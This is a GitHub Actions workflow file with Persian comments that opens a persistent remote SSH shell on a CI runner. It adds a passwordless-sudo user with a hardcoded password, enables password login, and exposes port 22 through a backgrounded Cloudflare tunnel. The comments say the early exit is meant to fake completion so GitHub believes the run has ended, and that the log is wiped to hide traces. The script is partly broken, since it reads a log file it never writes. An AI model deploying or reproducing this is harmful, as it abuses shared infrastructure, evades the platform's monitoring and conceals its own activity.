name: Linux SSH via Cloudflare Tunnel (Persistence)

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 1  # این رو به ۱ دقیقه می‌ذاریم تا گیت‌هاب زودتر فکر کنه ران تموم شده

    steps:
      - name: 1. Setup User and Root Access
        run: |
          sudo useradd -m -s /bin/bash prxcore
          echo "prxcore:P@ssw0rd2026!" | sudo chpasswd
          sudo usermod -aG sudo prxcore
          echo "prxcore ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/prxcore

      - name: 2. Configure SSH Service
        run: |
          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo systemctl restart ssh

      - name: 3. Download & Run Cloudflare Tunnel (Background)
        run: |
          curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
          chmod +x cloudflared
          
          # فرستادن به پس‌زمینه با nohup و جدا کردن از شل
          nohup ./cloudflared tunnel --url tcp://localhost:22 > /dev/null 2>&1 &
          disown

      - name: 4. Extract Info & Exit Cleanly (Fake Done)
        run: |
          sleep 5  # صبر می‌کنیم تا لاگ تونل تولید بشه
          TUNNEL_URL=$(grep -o 'https://[a-zA-Z0-9-]*\.trycloudflare\.com' cloudflare.log | head -n 1 | sed 's|https://||')
          
          echo "=================================================="
          echo " >>> TUNNEL IS ALIVE IN BACKGROUND <<<"
          echo " Cloudflare Host : $TUNNEL_URL"
          echo " Username        : prxcore"
          echo " Password        : P@ssw0rd2026!"
          echo "=================================================="
          
          # پاک کردن لاگ برای مخفی کردن رد پا
          echo "" > cloudflare.log
          
          # خروج با موفقیت تا گیت‌هاب فکر کنه کار تموم شده
          exit 0
